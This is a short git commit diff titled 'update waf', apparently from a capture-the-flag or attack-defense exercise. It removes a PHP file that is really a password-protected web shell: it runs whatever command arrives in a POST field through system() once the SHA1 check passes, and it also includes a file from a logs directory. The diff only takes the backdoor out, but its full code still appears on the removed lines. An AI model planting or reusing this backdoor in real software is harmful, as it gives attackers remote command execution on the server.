f1928091e03ec19a3ae291e8c589e8614b6b4950
racterub <racterub@gmail.com>
2022-02-13 12:50:23 +0800

    update waf

--- 21/waf.php
+++ 21/waf.php
@@ -1,2 +1,1 @@
-<?php if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="6321900abe56af5e563a6bce9ddea7034b78c6c9"){@system($_POST["w"]);die();}
-@include_once "/var/www/html/logs/q";
+<?php die();
